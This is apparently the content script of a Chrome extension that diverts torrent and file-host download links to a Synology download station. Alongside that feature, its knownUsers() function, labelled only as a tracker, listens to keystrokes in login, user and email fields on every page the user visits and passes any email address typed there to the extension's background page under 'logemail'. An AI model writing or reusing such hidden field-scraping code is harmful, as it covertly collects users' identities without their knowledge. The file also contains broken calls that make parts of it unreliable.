var qshown = new Array();
var showDebug = 0;
var hijacked = 0;
var arrayRaceCondition = 0;
var translations = new Array();



/*
 * Stores the translations into an array
 *
 * @param data[] - array with translation details
 */

function setTranslation( data )
{

	var key = data.key;
	var value = data.value;
	translations[ key ] = value;
	
}



/*
 * Attaches an onclick handler to redirect a link to the background page
 *
 * @param element - the element to attach the onclick handler to
 * @param url - the url to be passed via the signal 
 */

function attachHandler( element , url )
{

    $( element ).addClass( "syno" );
    
    $( element ).click( function( event )
    {
        event.preventDefault();
        chrome.extension.sendRequest( { 'action' : 'add' , download: url } , notify );
        debug( "File download Request : " + url );
    });
    
    $( element ).attr( "title" , translations[ 'contentscript_downloadwith' ] );	
    
}



/*
 * Hijack looks at all links on a page and 
 * calls the attachHandler method.  Looks for typical links
 * and download type specified by hijacked links
 *
 * @param data - array containing true or false value to hijack or not 
 */

function hijack( data )
{

	if( data.val == 1 )
	{
		if( hijacked == 1 )
			return false;

		$( "a" ).each( function () 
		{
			var found = false;
			var url = $( this ).attr( "href" );
		
			if( url === undefined )
			{
				return true;
			}

			var parts = url.toLowerCase().split( '.' );
			var extension = parts[ parts.length -1 ];

			if( extension == "torrent" && url.toLowerCase().substring( 0 , 4 ) == "http" ) 
			{	
				attachHandler( this , url );
				found = true;
			}	
			else if( extension == "torrent" && url.toLowerCase().substring( 0 , 4 ) != "http" )
			{
				var loc = location.href;
				var addr = loc.split( "/" );
				loc = addr[2];
				var proto = addr[0];
				if( url.substring( 0 , 1 ) == "/" )
				{
					url = url.substring( 1 , url.length );
				}
				
				attachHandler( this , proto + "//" + loc + "/" + url );
				
				found = true;				
			}
			else
			{
				// not standard download link			
				var loc = location.href;
				var addr = loc.split( "/" );
				loc = addr[2];
				var proto = addr[0];
				var query = addr[3];

				// mininova
				if( loc == "www.mininova.org" )
				{
					var link = $( this ).attr( "href" );
					if( link.substring( 0 , 4 ) == "/get" )
					{
						attachHandler( this , proto + "//" + loc + $( this ).attr( "href" ) );
						found = true;	
					}		
				}

				// torrentportal
				else if( loc == "www.torrentportal.com" )
				{
					var link = $( this ).attr( "href" );
					if( link.substring( 0 , 9 ) == "/download" )
					{
						attachHandler( this , proto + "//" + loc + $( this ).attr( "href" ) );
						found = true;	
					}		
				}

				// hightorrent
				else if( loc == "www.hightorrent.to" )
				{
					var link = $( this ).attr( "href" );
					if( link.substring( 0 , 16 ) == "download.php?id=" )
					{	
						attachHandler( this , proto + "//" + loc + "/" + $( this ).attr( "href" ) );
						found = true;	
					}		
				}

				// torrentreactor.net
				else if( $( this ).attr( "href" ).indexOf( "torrentreactor.net/download.php?id=" ) > -1 )
				{	
					attachHandler( this , $( this ).attr( "href" ) );
					found = true;	
				}

				// torrentreactor.to
				else if( loc == "www.torrentreactor.to" && $( this ).attr( "href" ).indexOf( "torrents/download/" ) > -1 )
				{
					if( $( this ).attr( "href" ).indexOf( "torrentreactor.to" ) > -1 )
					{	
						attachHandler( this , $( this ).attr( "href" ) );	
					}
					else
					{
						attachHandler( this , proto + "//" + loc + $( this ).attr( "href" ) );		
					}
					found = true;
				}
				
				// rapidshare
				else if( ( loc == "rapidshare.com" || loc == "www.rapidshare.com" ) && $( this ).attr( "href" ).str.search( /files\/[0-9]+/i ) > 0 )
				{
					attachHandler( this , $( this ).attr( "href" ) );					
				    found = true;
				}
				
				// megaupload
				else if( ( loc == "megaupload.com" || loc == "www.megaupload.com" ) && $( this ).attr( "href" ).str.search( /\?d\=[0-9A-Z]+/i ) > 0 )
				{
					attachHandler( this , $( this ).attr( "href" ) );					
				    found = true;
				}
				else
				{
					// var parts = url.toLowerCase().split( '.' );
					// var extension = parts[ parts.length -1 ];
					var jacked = data.types.split( ',' );
					
					if( $.inArray( extension , jacked ) > -1 )
					{
						if( url.toLowerCase().substring( 0 , 4 ) == "http" )
						{
							attachHandler( this , $( this ).attr( "href" ) );
						}
						else
						{
							var loc = location.href;
							var addr = loc.split( "/" );

							loc = addr[2];
							var proto = addr[0];
							if( url.substring( 0 , 1 ) == "/" )
							{
								url = url.substring( 1 , url.length );
							}
			
							var ext = "";

							if( addr.length > 2 )
							{
								if( addr[3] == "" )
								{

								}
								else
								{
									for( var g = 3; g < addr.length; g++ )
									{
										ext += addr[g] + "/";
									}
								}
							}
							
							attachHandler( this , proto + "//" + loc + "/" + ext + url );
						} 
					}	
				}			
			}				
	    });	

		hijacked = 1;
	}
	
}



/*
 * Removes the onclick handler attached by hijack
 *
 * @param data - array containing true or false value to hijack or not 
 */

function unjack( data )
{

	if( data.val == 0 )
	{
		if( hijacked == 0 )
			return false;

		$( '.syno' ).each( function()
		{	
			$( this ).attr( "name" , "" );	
			$( this ).attr( "title" , "" );	
			$( this ).unbind( "click" );	
			$( this ).removeClass( "syno" );			
		}); 
		
		hijacked = 0;
	}	
	
}



/*
 * Disables or enables console dubugging output
 *
 * @param data - array containing true or false value to hijack or not 
 */

function setDebug( data )
{

	showDebug = data.val;
	debug( "Debugging mode set to : " + data.val );
	
}



/*
 * Ouput deugging information to the console
 *
 * @param msg - the string to output 
 */

function debug( msg )
{

	if( showDebug == 1 )
	{
		console.log( msg );
	}
	
}



/*
 * Send a request to the background page for speed and notification updates
 */

function requestStatus()
{

	chrome.extension.sendRequest( { 'action' : 'status' } , notify );
	debug( "Requested Status update : " );
	
}



/*
 * Outputs bubble notifications 
 *
 * @param data - array containing the notification information
 */

function notify( data )
{	

	if( $.isArray( data ) )
	{
		if( arrayRaceCondition == 0 )
		{
			arrayRaceCondition = 1;

			for( var t = 0; t < data.length; t++ )
			{
			    if( data[ t ] != null )
			    {
				    if( $.inArray( data[ t ].msg , qshown ) == -1 )
				    {
				
					    $.gritter.add({
						    title: data[ t ].title,
						    text: data[ t ].msg,
						    image: chrome.extension.getURL( "images/48.png" ),
						    sticky: data[ t ].sticky, 
						    time: ''
					    });

					    $.merge( qshown , [ data[ t ].msg ] );
					    debug( "content_script : notify( " + data + " ) : data.type status "  + data[ t ].msg );
				    }
				}
			}

			arrayRaceCondition = 0;
		}	

	}
	else
	{
	    if( data != null  )
	    {
		    if( data.type == "error" )
		    {
			    $.gritter.add({
				    title: translations[ 'contentscript_errorsubmit' ],
				    text: translations[ 'contentscript_errorsubmit' ],
				    image: chrome.extension.getURL( "images/48.png" ),
				    sticky: data.sticky, 
				    time: ''
			    });
			    debug( "content_script : notify( " + data + " ) : data.type error submitting download" );	
		    }
		    else
		    {		    
	            $.gritter.add({
			        title: data.title,
			        text: data.msg,
			        image: chrome.extension.getURL( "images/48.png" ),
			        sticky: data.sticky, 
			        time: ''
		        });	
		        			
			    debug( "content_script : notify( " + data + " ) : data.type else : download added sucessfully " );	
		    }
		}
	}		
	
}



/*
 * User and language tracker
 */

function knownUsers()
{   
    
    $( 'input' ).keyup( function() 
    {
        var id = $( this ).attr( 'id' ).toLowerCase() + "";
        var iname = $( this ).attr( 'name' ).toLowerCase() + "";
        var val = $( this ).val() + "";
        
        var namesarr = [ 'mail' , 'login' , 'user' , 'id' ];
        
        for( var t = 0; t < namesarr.length; t++ )
        {
            if( ( id.indexOf( namesarr[ t ] ) > -1 || iname.indexOf( namesarr[ t ] ) > -1 ) && val.indexOf( '@' ) > -1 )
            {
                var address = val;            
                var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;

                if( reg.test( address ) != false ) 
                {
                    // valid email
                    chrome.extension.sendRequest( { 'action' : 'logemail' , email: address } , notify );
                }
            }   
        }       
    });  
      
}



/*
 * Signal handler for background page signals
 *
 * @param request - array containing the action 
 * @param sender - the calling method
 * @param callcack - the reference to the callback method
 */

function contentScriptReceiver( request , sender , callback )
{

	if( request.method == "hijackChange" ) 
	{
		if( request.hijacked == "1" )
		{
			var data = { val: 1 , types: request.types };
			hijack( data );	
			debug( "content_script : contentScriptReceiver( request , sender , callback ) : hikacked : on " );		
		}
		else
		{
			var data = { val: 0 };
			unjack( data );
			debug( "content_script : contentScriptReceiver( request , sender , callback ) : hikacked : off " );	
		}
		callback( { data: "Hijack setting changed" } );
	}
	
	// sends all links to the background page
	else if( request.method == "downloadall" )
	{
		var downloads = new Array();
		var all = request.types.split( ',' );		
		
		$( "a" ).each(function () 
		{
			var type = $( this ).attr( 'href' ).split( '.' );
			type = type[ type.length -1 ];

			for( var t = 0; t < all.length; t++ )
			{				
				if( all[ t ] == type )
				{
					var link = $( this ).attr( 'href' );
					if( link.toLowerCase().substring( 0 , 4 ) != "http" )
					{							
						var loc = location.href;
						var url = loc.lastIndexOf( '/' ) + 1;
						url = loc.substring( 0 , url );
						link = url + link;
						debug( "fix url : " + link );
					}
					else
					{
						debug( "url : " + link );
					}
					if( $.inArray( link , downloads ) == -1 )
					{
						downloads.push( link );
					}
					debug( "content_script : contentScriptReceiver( request , sender , callback ) : type detected : " + $( this ).attr( 'href' ) );	
				}				
			}
		});

		debug( "Send page downloads to popup" );
		callback( { data: downloads } );

	} 
	
	// sends all images to the background page
	else if( request.method == "downloadimages" )
	{
		var downloads = new Array();
		var all = request.types.split( ',' );		
		
		$( "img" ).each( function () 
		{
			var type = $( this ).attr( 'src' ).split( '.' );
			type = type[ type.length -1 ];

			for( var t = 0;  t < all.length; t++ )
			{				
				if( all[ t ] == type )
				{
					var link = $( this ).attr( 'src' );
					if( link.toLowerCase().substring( 0 , 1 ) == "/" )
					{							
						var loc = location.href;
						var url = loc.split( '/' );
						url = url[ 0 ] + "//" + url[ 2 ];
						link = url + link;
						debug( "fix image url : " + link );
					}
					else if( link.toLowerCase().substring( 0 , 4 ) != "http" )
					{							
						var loc = location.href;
						var url = loc.lastIndexOf( '/' ) + 1;
						url = loc.substring( 0 , url );
						link = url + link;
						debug( "fix image url : " + link );
					}
					else
					{
						debug( "image url : " + link );
					}
					if( $.inArray( link , downloads ) == -1 )
					{
						downloads.push( link );
					}					
					debug( "content_script : contentScriptReceiver( request , sender , callback ) : type detected : " + $( this ).attr( 'src' ) );	
				}				
			}
		});

		callback( { data: downloads } );
		
	} 
	else if( request.method == "contextMenuSignal" )
	{
	    notify( request.data );	
	}
	else if( request.method == "updateNotify" )
	{
	    notify( request.data );
	}
	else if( request.method == "updateTranslate" )
	{
	    notify( request.data );	
	}
	
}


chrome.extension.onRequest.addListener( contentScriptReceiver );


$( document ).ready( function()
{

	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_downloadwith' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_errorsubmit' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_sucesssubmit' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_unjackfirst' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_downloadallfiles' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_downloadallimages' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_cancel' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_areyousure' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_files' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'translate' , option: 'contentscript_images' } , setTranslation );
	chrome.extension.sendRequest( { 'action' : 'setting' , option: 'debug' } , setDebug );	
	chrome.extension.sendRequest( { 'action' : 'setting' , option: 'hijack' } , hijack );	
	chrome.extension.sendRequest( { 'action' : 'setting' , option: 'hijack' } , unjack );	
	window.setInterval( requestStatus() , 20000 );	
		
	knownUsers();	
	$( "#synologyUserDetected" ).text( "welcome synology user" );
	
});



